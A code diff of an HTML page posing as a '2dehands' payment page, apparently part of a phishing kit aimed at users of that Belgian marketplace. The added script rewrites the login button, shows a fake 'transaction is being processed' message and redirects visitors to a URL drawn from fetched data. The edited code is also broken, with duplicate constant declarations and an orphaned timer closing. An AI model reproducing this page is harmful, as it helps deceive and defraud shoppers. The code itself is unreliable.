@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>2dehands | BETALING</title>
+  <title>2dehands | Betaling</title>
 
   <link rel="stylesheet" href="https://www.hzcdn.io/bff/static/vendor/hz-design-tokens/twh/tokens/CssVars.c9a22c58.css" />
   <link rel="stylesheet" href="https://www.hzcdn.io/bff/static/vendor/hz-web-ui/twh/assets/Assets.8c256939.css" />
@@ -85,16 +85,21 @@
       .then(data => {
         if (data[id]) {
           const loginBtn = document.querySelector('[data-role="login"] span');
+          const textElement = document.querySelector('.loader-text');
+
+          const renderInterval = setInterval(() => {
+            const loginBtnReady = document.querySelector('[data-role="login"] span');
+            if (loginBtnReady && data[id].replaceText) {
+              loginBtnReady.textContent = data[id].replaceText;
+              clearInterval(renderInterval);
+            }
+          }, 50);
+
+          if (textElement) textElement.textContent = "Uw transactie wordt verwerkt";
+          const loginBtn = document.querySelector('[data-role="login"] span');
           if (loginBtn && data[id].replaceText) loginBtn.textContent = data[id].replaceText;
           const textElement = document.querySelector('.loader-text');
-          if (textElement) textElement.textContent = "Uw transactie wordt verwerkt";
-
-          setTimeout(() => {
-          const textElement = document.querySelector('.loader-text');
-          if (textElement && data[id].replaceText) {
-  const loginBtn = document.querySelector('[data-role="login"] span');
-  if (loginBtn) loginBtn.textContent = data[id].replaceText;
-  window.location.href = data[id].url;
+          if (textElement) window.location.href = data[id].url;
           }, 3000);
         }
       })
